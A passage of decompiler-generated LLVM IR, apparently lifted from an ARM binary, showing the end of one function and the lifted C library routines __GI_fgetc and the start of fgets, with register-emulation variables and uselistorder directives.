  %v9_1c718 = icmp eq i32 %v0_1c718, %v3_1c714
  store i1 %v9_1c718, i1* %cpsr_z.global-to-local, align 1
  %v1_1c71c = add i32 %v0_1c714, 12
  store i32 %v1_1c71c, i32* %r5.global-to-local, align 4
  br i1 %v9_1c718, label %dec_label_pc_1c728, label %bb257

bb257:                                            ; preds = %dec_label_pc_1c700
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1c748

dec_label_pc_1c728:                               ; preds = %dec_label_pc_1c700
  %v0_1c72c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1c728 = load i32, i32* %r6.global-to-local, align 4
  %v3_1c728 = icmp ult i32 %v1_1c71c, %v1_1c728
  %v9_1c728 = icmp eq i32 %v1_1c71c, %v1_1c728
  store i1 %v9_1c728, i1* %cpsr_z.global-to-local, align 1
  %v2_1c72c = add i32 %v0_1c72c.pre, %v3_1c714
  store i32 %v2_1c72c, i32* %r7.global-to-local, align 4
  br i1 %v3_1c728, label %dec_label_pc_1c700, label %dec_label_pc_1c748

dec_label_pc_1c740:                               ; preds = %.thread21, %bb239
  %v0_1c740 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1c740, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1c440

dec_label_pc_1c748:                               ; preds = %dec_label_pc_1c728, %bb257
  %v0_1c748 = phi i32 [ -1, %bb257 ], [ %v2_1c72c, %dec_label_pc_1c728 ]
  store i32 %v0_1c748, i32* %r0.global-to-local, align 4
  store i32 %v27_1bf84, i32* @lr, align 4
  ret i32 %v0_1c748

; uselistorder directives
  uselistorder i32 %v0_1c748, { 1, 0 }
  uselistorder i32 %v1_1c728, { 1, 0 }
  uselistorder i32 %v1_1c71c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1c700, { 2, 1, 0 }
  uselistorder i32 %v3_1c6a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1c668, { 0, 1, 3, 2 }
  uselistorder i32 %v4_1c65c, { 1, 2, 0 }
  uselistorder i32 %v0_1c65c, { 1, 0 }
  uselistorder i32 %v1_1c664.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1c61c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1c618, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_1c5dc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_1c5a4, { 1, 0 }
  uselistorder i32 %v1_1c5a4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1c5a0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_1c500, { 2, 1, 0 }
  uselistorder i32 %v2_1c480, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_1c470, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_1c45c, { 1, 0, 2 }
  uselistorder i32 %v5_1c458, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1c4e830, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_1c410, { 1, 0 }
  uselistorder i32 %v1_1c408, { 1, 2, 0 }
  uselistorder i32 %v2_1c3fc, { 1, 0 }
  uselistorder i32 %v1_1c3fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1c3fc, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_1c3cc, { 1, 0 }
  uselistorder i32 %v0_1c3cc, { 0, 2, 1 }
  uselistorder i32 %v2_1c3c8, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_1c3b4, { 1, 0 }
  uselistorder i1 %v2_1c3a4, { 1, 0 }
  uselistorder i32 %v1_1c3a0, { 3, 2, 1, 0 }
  uselistorder i32 %v2_1c39c, { 1, 0 }
  uselistorder i1 %v2_1c38c, { 1, 0 }
  uselistorder i32 %v1_1c380, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_1c334, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1c334, { 1, 0, 2 }
  uselistorder i1 %v2_1c31c, { 1, 0 }
  uselistorder i32 %v5_1c304, { 1, 0 }
  uselistorder i32 %v0_1c2f0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1c2d8, { 1, 2, 0 }
  uselistorder i32 %v2_1c2d4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1c26c, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1c214, { 1, 0 }
  uselistorder double %v2_1c1d8, { 1, 0 }
  uselistorder i32 %v0_1c194, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_1c188, { 1, 0 }
  uselistorder i32 %v2_1c1c4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1c158, { 1, 0 }
  uselistorder i32 %v5_1c114, { 1, 0 }
  uselistorder i32 %v1_1c034.v0_1c0205, { 1, 0 }
  uselistorder i32 %v3_1c0f0, { 1, 0 }
  uselistorder i32 %v0_1c0cc, { 0, 2, 3, 1 }
  uselistorder i32 %v2_1c0b4, { 2, 1, 0 }
  uselistorder i32 %v0_1c098, { 1, 0 }
  uselistorder i32 %v0_1bfb8, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 0, 9, 10, 13, 14, 15, 11, 16, 17, 12, 18, 21, 19, 20, 22 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 16, 13, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 2, 10, 11, 18, 20, 17, 19, 12, 13, 21, 14, 15, 5, 22, 16, 4, 23, 24, 3, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 3, 4, 5, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 57, { 2, 1, 0 }
  uselistorder i32 102, { 1, 2, 3, 4, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34740), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -34764), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_1c740, { 1, 0 }
  uselistorder label %dec_label_pc_1c6f8, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_1c658, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c5d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c5a0, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1c578, { 1, 0 }
  uselistorder label %dec_label_pc_1c54c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c528, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c4f8, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c440, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1c430, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_1c358, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c264, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1c214, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c20c, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_1c0f0, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_1c00c, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1c778 = load i32, i32* @r4, align 4
  store i32 %v3_1c778, i32* %stack_var_-20, align 4
  %v6_1c778 = load i32, i32* @r5, align 4
  %v9_1c778 = load i32, i32* @r6, align 4
  %v12_1c778 = load i32, i32* @r7, align 4
  %v15_1c778 = load i32, i32* @lr, align 4
  %v1_1c77c = add i32 %arg1, 52
  %v2_1c77c = inttoptr i32 %v1_1c77c to i32*
  %v3_1c77c = load i32, i32* %v2_1c77c, align 4
  store i32 %v3_1c77c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c780 = icmp eq i32 %v3_1c77c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_1c780, label %dec_label_pc_1c7b4, label %dec_label_pc_1c790

dec_label_pc_1c790:                               ; preds = %entry
  %v1_1c790 = add i32 %arg1, 16
  %v2_1c790 = inttoptr i32 %v1_1c790 to i32*
  %v3_1c790 = load i32, i32* %v2_1c790, align 4
  store i32 %v3_1c790, i32* %r2.global-to-local, align 4
  %v1_1c794 = add i32 %arg1, 24
  %v2_1c794 = inttoptr i32 %v1_1c794 to i32*
  %v3_1c794 = load i32, i32* %v2_1c794, align 4
  store i32 %v3_1c794, i32* %r3.global-to-local, align 4
  %v3_1c798 = icmp uge i32 %v3_1c790, %v3_1c794
  store i1 %v3_1c798, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1c798, label %dec_label_pc_1c7a8, label %.thread

.thread:                                          ; preds = %dec_label_pc_1c790
  %v2_1c79c = inttoptr i32 %v3_1c790 to i8*
  %v3_1c79c = load i8, i8* %v2_1c79c, align 1
  %v4_1c79c = zext i8 %v3_1c79c to i32
  store i32 %v4_1c79c, i32* %r5.global-to-local, align 4
  %v6_1c79c = add i32 %v3_1c790, 1
  store i32 %v6_1c79c, i32* %r2.global-to-local, align 4
  store i32 %v6_1c79c, i32* %v2_1c790, align 4
  br label %dec_label_pc_1c8ac

dec_label_pc_1c7a8:                               ; preds = %dec_label_pc_1c790
  %v1_1c7a8 = inttoptr i32 %arg1 to i16*
  %v2_1c7a8 = call i32 @getc_unlocked(i16* %v1_1c7a8)
  store i32 %v2_1c7a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1c8ac

dec_label_pc_1c7b4:                               ; preds = %entry
  %v0_1c7b4 = call i32 @__aeabi_read_tp()
  %v0_1c7b8 = load i32, i32* @r7, align 4
  %v1_1c7b8 = add i32 %v0_1c7b8, 64
  %v2_1c7b8 = inttoptr i32 %v1_1c7b8 to i32*
  %v3_1c7b8 = load i32, i32* %v2_1c7b8, align 4
  store i32 %v3_1c7b8, i32* %r3.global-to-local, align 4
  %v1_1c7bc = add i32 %v0_1c7b4, -1168
  store i32 %v1_1c7bc, i32* @r6, align 4
  %v3_1c7c0 = icmp uge i32 %v3_1c7b8, %v1_1c7bc
  store i1 %v3_1c7c0, i1* %cpsr_c.global-to-local, align 1
  %v9_1c7c0 = icmp eq i32 %v3_1c7b8, %v1_1c7bc
  br i1 %v9_1c7c0, label %dec_label_pc_1c808, label %dec_label_pc_1c7c8

dec_label_pc_1c7c8:                               ; preds = %dec_label_pc_1c7b4
  %v1_1c7c8 = add i32 %v0_1c7b8, 56
  store i32 %v1_1c7c8, i32* @r5, align 4
  store i32 %v1_1c7c8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c7d4

dec_label_pc_1c7d4:                               ; preds = %dec_label_pc_1c7e0.dec_label_pc_1c7d4_crit_edge, %dec_label_pc_1c7c8
  %v0_1c7d4 = phi i32 [ %v0_1c7d4.pre, %dec_label_pc_1c7e0.dec_label_pc_1c7d4_crit_edge ], [ %v1_1c7c8, %dec_label_pc_1c7c8 ]
  %v1_1c7d4 = inttoptr i32 %v0_1c7d4 to i32*
  %v2_1c7d4 = load i32, i32* %v1_1c7d4, align 4
  store i32 %v2_1c7d4, i32* %r3.global-to-local, align 4
  %v1_1c7d8 = load i32, i32* @r4, align 4
  %v3_1c7d8 = icmp uge i32 %v2_1c7d4, %v1_1c7d8
  store i1 %v3_1c7d8, i1* %cpsr_c.global-to-local, align 1
  %v9_1c7d8 = icmp eq i32 %v2_1c7d4, %v1_1c7d8
  br i1 %v9_1c7d8, label %dec_label_pc_1c7e0, label %dec_label_pc_1c7f8

dec_label_pc_1c7e0:                               ; preds = %dec_label_pc_1c7d4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1c7f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1c7f0, label %dec_label_pc_1c7f4, label %dec_label_pc_1c7e0.dec_label_pc_1c7d4_crit_edge

dec_label_pc_1c7e0.dec_label_pc_1c7d4_crit_edge:  ; preds = %dec_label_pc_1c7e0
  %v0_1c7d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c7d4

dec_label_pc_1c7f4:                               ; preds = %dec_label_pc_1c7e0
  %v0_1c7f4 = load i32, i32* @r4, align 4
  store i32 %v0_1c7f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c7f8

dec_label_pc_1c7f8:                               ; preds = %dec_label_pc_1c7d4, %dec_label_pc_1c7f4
  %v0_1c7f8 = phi i32 [ %v0_1c7f4, %dec_label_pc_1c7f4 ], [ %v2_1c7d4, %dec_label_pc_1c7d4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c7f8 = icmp eq i32 %v0_1c7f8, 0
  br i1 %v2_1c7f8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1c7f8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1c7f8, %bb
  store i32 116740, i32* @lr, align 4
  %v1_1c800 = xor i1 %v2_1c7f8, true
  call void @__pseudo_cond_branch(i1 %v1_1c800, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1c804 = load i32, i32* @r6, align 4
  %v1_1c804 = load i32, i32* @r7, align 4
  %v2_1c804 = add i32 %v1_1c804, 64
  %v3_1c804 = inttoptr i32 %v2_1c804 to i32*
  store i32 %v0_1c804, i32* %v3_1c804, align 4
  %v0_1c808.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1c808

dec_label_pc_1c808:                               ; preds = %dec_label_pc_1c7b4, %bb18
  %v1_1c818 = phi i32 [ %v0_1c7b8, %dec_label_pc_1c7b4 ], [ %v0_1c808.pre, %bb18 ]
  %v1_1c808 = add i32 %v1_1c818, 60
  %v2_1c808 = inttoptr i32 %v1_1c808 to i32*
  %v3_1c808 = load i32, i32* %v2_1c808, align 4
  store i32 %v3_1c808, i32* %r2.global-to-local, align 4
  %v1_1c80c = add i32 %v1_1c818, 16
  %v2_1c80c = inttoptr i32 %v1_1c80c to i32*
  %v3_1c80c = load i32, i32* %v2_1c80c, align 4
  store i32 %v3_1c80c, i32* @r1, align 4
  %v1_1c810 = add i32 %v1_1c818, 24
  %v2_1c810 = inttoptr i32 %v1_1c810 to i32*
  %v3_1c810 = load i32, i32* %v2_1c810, align 4
  store i32 %v3_1c810, i32* %r3.global-to-local, align 4
  %v1_1c814 = add i32 %v3_1c808, 1
  store i32 %v1_1c814, i32* %r2.global-to-local, align 4
  store i32 %v1_1c814, i32* %v2_1c808, align 4
  %v0_1c81c = load i32, i32* @r1, align 4
  %v1_1c81c = load i32, i32* %r3.global-to-local, align 4
  %v3_1c81c = icmp uge i32 %v0_1c81c, %v1_1c81c
  store i1 %v3_1c81c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1c81c, label %dec_label_pc_1c82c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1c808
  %v2_1c820 = inttoptr i32 %v0_1c81c to i8*
  %v3_1c820 = load i8, i8* %v2_1c820, align 1
  %v4_1c820 = zext i8 %v3_1c820 to i32
  store i32 %v4_1c820, i32* %r5.global-to-local, align 4
  %v6_1c820 = add i32 %v0_1c81c, 1
  store i32 %v6_1c820, i32* @r1, align 4
  %v2_1c824 = load i32, i32* @r7, align 4
  %v3_1c824 = add i32 %v2_1c824, 16
  %v4_1c824 = inttoptr i32 %v3_1c824 to i32*
  store i32 %v6_1c820, i32* %v4_1c824, align 4
  br label %dec_label_pc_1c838

dec_label_pc_1c82c:                               ; preds = %dec_label_pc_1c808
  %v0_1c82c = load i32, i32* @r7, align 4
  %v1_1c830 = inttoptr i32 %v0_1c82c to i16*
  %v2_1c830 = call i32 @getc_unlocked(i16* %v1_1c830)
  store i32 %v2_1c830, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1c838

dec_label_pc_1c838:                               ; preds = %.thread2, %dec_label_pc_1c82c
  %v0_1c838 = load i32, i32* @r7, align 4
  %v1_1c838 = add i32 %v0_1c838, 60
  %v2_1c838 = inttoptr i32 %v1_1c838 to i32*
  %v3_1c838 = load i32, i32* %v2_1c838, align 4
  %v1_1c83c = add i32 %v3_1c838, -1
  store i32 %v1_1c83c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c840 = icmp eq i32 %v1_1c83c, 0
  store i32 %v1_1c83c, i32* %v2_1c838, align 4
  br i1 %v2_1c840, label %dec_label_pc_1c84c, label %dec_label_pc_1c8ac

dec_label_pc_1c84c:                               ; preds = %dec_label_pc_1c838
  %v0_1c84c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c84c = load i32, i32* @r7, align 4
  %v2_1c84c = add i32 %v1_1c84c, 64
  %v3_1c84c = inttoptr i32 %v2_1c84c to i32*
  store i32 %v0_1c84c, i32* %v3_1c84c, align 4
  %v0_1c850 = load i32, i32* @r7, align 4
  %v1_1c850 = add i32 %v0_1c850, 56
  store i32 %v1_1c850, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c854

dec_label_pc_1c854:                               ; preds = %dec_label_pc_1c884.dec_label_pc_1c854_crit_edge, %dec_label_pc_1c84c
  %v0_1c85c = phi i32 [ %v0_1c85c.pre, %dec_label_pc_1c884.dec_label_pc_1c854_crit_edge ], [ %v1_1c850, %dec_label_pc_1c84c ]
  %v0_1c854 = phi i32 [ %v0_1c854.pre, %dec_label_pc_1c884.dec_label_pc_1c854_crit_edge ], [ %v0_1c850, %dec_label_pc_1c84c ]
  %v1_1c854 = add i32 %v0_1c854, 56
  %v2_1c854 = inttoptr i32 %v1_1c854 to i32*
  %v3_1c854 = load i32, i32* %v2_1c854, align 4
  store i32 %v3_1c854, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1c85c, i32* %r2.global-to-local, align 4
  %v1_1c86022 = inttoptr i32 %v0_1c85c to i32*
  %v2_1c86023 = load i32, i32* %v1_1c86022, align 4
  store i32 %v2_1c86023, i32* %r3.global-to-local, align 4
  %v3_1c86425 = icmp uge i32 %v2_1c86023, %v3_1c854
  store i1 %v3_1c86425, i1* %cpsr_c.global-to-local, align 1
  %v9_1c86431 = icmp eq i32 %v2_1c86023, %v3_1c854
  br i1 %v9_1c86431, label %dec_label_pc_1c86c, label %dec_label_pc_1c884

dec_label_pc_1c86c:                               ; preds = %dec_label_pc_1c854, %dec_label_pc_1c86c.dec_label_pc_1c860_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1c87c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1c87c, label %dec_label_pc_1c880, label %dec_label_pc_1c86c.dec_label_pc_1c860_crit_edge

dec_label_pc_1c86c.dec_label_pc_1c860_crit_edge:  ; preds = %dec_label_pc_1c86c
  %v0_1c860.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1c864.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1c860 = inttoptr i32 %v0_1c860.pre to i32*
  %v2_1c860 = load i32, i32* %v1_1c860, align 4
  store i32 %v2_1c860, i32* %r3.global-to-local, align 4
  %v3_1c864 = icmp uge i32 %v2_1c860, %v1_1c864.pre
  store i1 %v3_1c864, i1* %cpsr_c.global-to-local, align 1
  %v9_1c864 = icmp eq i32 %v2_1c860, %v1_1c864.pre
  br i1 %v9_1c864, label %dec_label_pc_1c86c, label %dec_label_pc_1c884

dec_label_pc_1c880:                               ; preds = %dec_label_pc_1c86c
  %v0_1c880 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1c880, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c884

dec_label_pc_1c884:                               ; preds = %dec_label_pc_1c854, %dec_label_pc_1c86c.dec_label_pc_1c860_crit_edge, %dec_label_pc_1c880
  %v0_1c88c = phi i32 [ %v0_1c880, %dec_label_pc_1c880 ], [ %v2_1c86023, %dec_label_pc_1c854 ], [ %v2_1c860, %dec_label_pc_1c86c.dec_label_pc_1c860_crit_edge ]
  %v1_1c884 = phi i32 [ %v0_1c880, %dec_label_pc_1c880 ], [ %v3_1c854, %dec_label_pc_1c854 ], [ %v1_1c864.pre, %dec_label_pc_1c86c.dec_label_pc_1c860_crit_edge ]
  %v3_1c884 = icmp uge i32 %v0_1c88c, %v1_1c884
  store i1 %v3_1c884, i1* %cpsr_c.global-to-local, align 1
  %v9_1c884 = icmp eq i32 %v0_1c88c, %v1_1c884
  br i1 %v9_1c884, label %dec_label_pc_1c88c, label %dec_label_pc_1c884.dec_label_pc_1c854_crit_edge

dec_label_pc_1c884.dec_label_pc_1c854_crit_edge:  ; preds = %dec_label_pc_1c884
  %v0_1c854.pre = load i32, i32* @r7, align 4
  %v0_1c85c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1c854

dec_label_pc_1c88c:                               ; preds = %dec_label_pc_1c884
  %v2_1c88c = icmp ne i32 %v1_1c884, 0
  store i1 %v2_1c88c, i1* %cpsr_c.global-to-local, align 1
  %v7_1c890 = icmp slt i32 %v1_1c884, 2
  br i1 %v7_1c890, label %dec_label_pc_1c8ac, label %dec_label_pc_1c894

dec_label_pc_1c894:                               ; preds = %dec_label_pc_1c88c
  %v0_1c898 = load i32, i32* @r1, align 4
  %v1_1c898 = add i32 %v0_1c898, 129
  store i32 %v1_1c898, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c8ac

dec_label_pc_1c8ac:                               ; preds = %.thread, %dec_label_pc_1c838, %dec_label_pc_1c894, %dec_label_pc_1c88c, %dec_label_pc_1c7a8
  %v0_1c8ac = load i32, i32* %r5.global-to-local, align 4
  %v2_1c8b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1c8b4, i32* @r4, align 4
  store i32 %v6_1c778, i32* @r5, align 4
  store i32 %v9_1c778, i32* @r6, align 4
  store i32 %v12_1c778, i32* @r7, align 4
  store i32 %v15_1c778, i32* @lr, align 4
  ret i32 %v0_1c8ac

; uselistorder directives
  uselistorder i32 %v0_1c880, { 1, 0, 2 }
  uselistorder i32 %v1_1c864.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1c81c, { 1, 0, 2 }
  uselistorder i32 %v1_1c818, { 0, 2, 1 }
  uselistorder i32 %v1_1c7d8, { 1, 0 }
  uselistorder i32 %v3_1c790, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1c8ac, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_1c884, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c86c, { 1, 0 }
  uselistorder label %dec_label_pc_1c838, { 1, 0 }
  uselistorder label %dec_label_pc_1c808, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_1c7f8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1c8bc = load i32, i32* @r4, align 4
  store i32 %v3_1c8bc, i32* %stack_var_-32, align 4
  %v6_1c8bc = load i32, i32* @r5, align 4
  %v9_1c8bc = load i32, i32* @r6, align 4
  %v12_1c8bc = load i32, i32* @r7, align 4
  %v15_1c8bc = load i32, i32* @r8, align 4
  %v24_1c8bc = load i32, i32* @lr, align 4
  %v1_1c8c0 = add i32 %arg3, 52
  %v2_1c8c0 = inttoptr i32 %v1_1c8c0 to i32*
  %v3_1c8c0 = load i32, i32* %v2_1c8c0, align 4
  store i32 %v3_1c8c0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c8c4 = icmp eq i32 %v3_1c8c0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_1c8c4, label %dec_label_pc_1c8d8, label %dec_label_pc_1c93c

dec_label_pc_1c8d8:                               ; preds = %entry
  %v0_1c8d8 = call i32 @__aeabi_read_tp()
  %v1_1c8dc = add i32 %arg3, 64
